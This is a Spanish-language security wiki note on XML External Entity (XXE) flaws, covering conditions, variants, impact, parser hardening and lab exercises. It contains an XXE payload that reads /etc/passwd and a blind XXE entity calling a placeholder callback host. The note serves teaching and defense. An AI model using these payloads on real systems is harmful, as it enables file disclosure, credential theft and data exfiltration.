---
type: concept
status: active
created: 2026-04-29
updated: 2026-04-29
tags:
  - cybersecurity
  - web-security
  - xxe
  - xml
sources:
  - "[[wiki/sources/Szsecurity Courses]]"
---

# XXE

## Definición
Las vulnerabilidades de XML External Entity (XXE) ocurren cuando un parser de XML resuelve entidades externas controladas por el atacante, permitiendo que el input XML dispare lecturas de archivos, SSRF o denegación de servicio.

## Por qué importa
XXE es una falla de configuración de parser. Una feature puede parecer aceptar XML ordinario, pero el parser puede traer archivos locales o recursos de red mientras expande entidades. Esto conecta el parseo de input con el acceso al sistema de archivos y a la red interna.

## Cómo funciona
XXE tiene **4 condiciones**:

1. **El input XML llega a un parser.**
2. **El procesamiento de DTD/entidades está habilitado.**
3. **El atacante puede definir una entidad externa.**
4. **La aplicación devuelve, usa o filtra la entidad expandida o el efecto secundario.**

Ejemplo con forma de payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE x [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>
```

El bug no es el XML en sí. El bug es dejar que XML no confiable controle la resolución de entidades.

## Técnicas / patrones
Los atacantes testean:

- bodies de request XML y subidas de archivos
- SOAP, SAML, SVG, DOCX/XLSX, import/export basado en XML
- payloads directos de lectura de archivos
- payloads de SSRF a metadata o servicios internos
- XXE ciego con callbacks DNS/HTTP out-of-band
- entidades de parámetro y comportamiento específico del parser

## Variantes y bypasses
XXE aparece en **5 formas**.

### 1. Divulgación de archivos in-band
La entidad expandida aparece en la response.

### 2. XXE ciego
La response oculta la salida, pero los callbacks DNS/HTTP prueban la resolución.

### 3. SSRF vía resolución de entidades
El parser trae URLs internas o endpoints de metadata.

### 4. XXE por subida de XML
SVG, archivos de office o imports XML subidos disparan el parseo del lado del servidor.

### 5. Denegación de servicio por expansión de entidades
Entidades recursivas o grandes consumen los recursos del parser.

## Impacto
Ordenado aproximadamente por severidad:

- **Divulgación de archivos locales.** Archivos sensibles o de configuración se filtran.
- **SSRF y alcanzabilidad interna.** El parseo de XML alcanza servicios internos.
- **Robo de credenciales.** La metadata de nube o los secretos locales quedan expuestos.
- **Denegación de servicio.** La expansión de entidades consume CPU o memoria.
- **Reconocimiento.** Los errores del parser revelan paths del sistema de archivos y librerías de XML.

## Detección y defensa
Ordenado por efectividad:

1. **Deshabilitá los DTDs y la resolución de entidades externas para XML no confiable.**
   Esto remueve la capacidad peligrosa del parser.

2. **Usá configuraciones de parser endurecidas y librerías seguras.**
   Los defaults varían por lenguaje y versión; configurá los parsers explícitamente.

3. **Evitá XML donde un formato más simple alcance.**
   JSON o formatos estrictos basados-en-esquema reducen el riesgo de resolución-de-entidades.

4. **Validá el esquema XML antes de la lógica de negocio.**
   La validación de esquema ayuda a moldear el input pero no debe requerir procesamiento inseguro de entidades.

5. **Restringí el acceso a red y sistema de archivos desde los workloads de parseo.**
   El aislamiento reduce el radio de explosión si un parser está mal configurado.

### Qué no funciona como defensa primaria

- **Filtrado de input para `<!DOCTYPE`.** Los encodings y features del parser pueden bypassear filtros ingenuos.
- **Asumir que sin response es seguro.** El XXE ciego puede usar callbacks.
- **Confiar solo en la validación de esquema.** El manejo de DTD/entidades puede ocurrir antes de una validación útil.
- **Bloquear un solo string de IP de metadata.** Los bypasses estilo-SSRF igual aplican.

## Labs prácticos
Usá labs locales o targets intencionalmente vulnerables.

### Ubicar parsers de XML

```bash
rg -n "DocumentBuilder|SAXParser|XMLInputFactory|lxml|etree|XmlReader|simplexml|DOMDocument" src
```

Revisá las opciones del parser para el comportamiento de DTD y entidades externas.

### Testear el comportamiento de lectura de archivos seguro

```bash
curl -i -H 'Content-Type: application/xml' --data-binary @payload.xml https://app.example.test/import
```

Usá solo archivos de lab inofensivos en entornos controlados.

### Testear callback ciego en un lab

```xml
<!DOCTYPE x [ <!ENTITY % ext SYSTEM "http://collab.example.test/xxe"> %ext; ]>
```

Los callbacks out-of-band prueban la resolución externa.

## Ejemplos prácticos
- Un endpoint SOAP parsea XML controlado por el atacante.
- Una subida de SVG dispara parseo de XML y lecturas de archivos.
- Una integración SAML acepta defaults inseguros del parser de XML.
- Una feature de import trae URLs internas a través de XXE.
- Un parser de documento de office expande entidades XML.

## Notas relacionadas
- [[ssrf|SSRF]]
- [[file-upload-abuse|Abuso de subida de archivos]]
- [[deserialization|Deserialización]]
- [[path-traversal|Path traversal]]
- [[cybersecurity/networking/metadata-endpoints|Endpoints de metadata]]

### Notas atómicas futuras sugeridas
- [[blind-xxe|XXE ciego]]
- [[xml-parser-hardening|Endurecimiento de parsers de XML]]
- [[svg-xxe|SVG XXE]]
- [[saml-xml-security|Seguridad de XML en SAML]]
- [[entity-expansion-dos|DoS por expansión de entidades]]

## Referencias
- **Foundational:** OWASP XML External Entity Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
- **Testing / Lab:** PortSwigger XXE — https://portswigger.net/web-security/xxe
- **Foundational:** OWASP WSTG latest — https://owasp.org/www-project-web-security-testing-guide/latest/
